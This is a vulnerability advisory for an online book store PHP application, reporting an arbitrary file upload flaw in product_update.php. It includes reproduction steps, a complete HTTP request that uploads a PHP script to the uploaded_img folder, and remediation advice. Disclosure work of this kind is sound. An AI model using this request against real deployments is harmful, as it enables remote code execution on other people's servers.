# keerti1924 / Online-Book-Store-Website - product_update.php Arbitrary FIle Upload

## Vendor Homepage:
[Online-Book-Store-Website](https://github.com/keerti1924/Online-Book-Store-Website)

## Impact
The product_update.php script in keerti1924's Online-Book-Store-Website allows for arbitrary file uploads, potentially leading to remote code execution or other security breaches. By exploiting this vulnerability, an authenticated admin user can upload malicious files, such as PHP scripts, to the server, allowing them to execute arbitrary code and compromise the system.

## Proof of Concept
Step 1: Login as an admin\
Step 2: Go to products section\
Step 3: Edit any product\
Step 4: Choose any file to upload\
Step 5: Update book\
Step 6: The file will be stored in the /uploaded_img directory on the server.\

## HTTP Request Example
```http request
POST /product_update.php?update=1 HTTP/2
Host: [REDACTED]
Cookie: PHPSESSID=[REDACTED];
Content-Length: 853
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryczeIpXB0W8h41atA
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

------WebKitFormBoundaryczeIpXB0W8h41atA
Content-Disposition: form-data; name="update_p_id"

1
------WebKitFormBoundaryczeIpXB0W8h41atA
Content-Disposition: form-data; name="update_old_image"

hua.php
------WebKitFormBoundaryczeIpXB0W8h41atA
Content-Disposition: form-data; name="update_image"; filename="nochizplz.php"
Content-Type: text/php

<?php phpinfo(); ?>

------WebKitFormBoundaryczeIpXB0W8h41atA
Content-Disposition: form-data; name="update_name"

The Thirteenth Tale
------WebKitFormBoundaryczeIpXB0W8h41atA
Content-Disposition: form-data; name="update_author"

Diane Setterfield
------WebKitFormBoundaryczeIpXB0W8h41atA
Content-Disposition: form-data; name="update_price"

55
------WebKitFormBoundaryczeIpXB0W8h41atA
Content-Disposition: form-data; name="update_product"


------WebKitFormBoundaryczeIpXB0W8h41atA--
```

## Proof with screenshot
![Screenshot](https://github.com/skid-nochizplz/skid-nochizplz/blob/main/TrashBin/CVE/keerti1924%20Online-Book-Store-Website/File%20Upload/Arbitrary%20FIle%20Upload%20in%20product_update.php%20Screenshot%20.png?raw=true)

## Remidiation
To mitigate this issue, implement proper input validation and file upload restrictions on the server-side. Only allow uploads of authorized file types and enforce strict file permissions to prevent execution of uploaded files as scripts. Additionally, consider implementing file upload scanning and validation mechanisms to detect and prevent the upload of malicious files.

## CWE
[CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)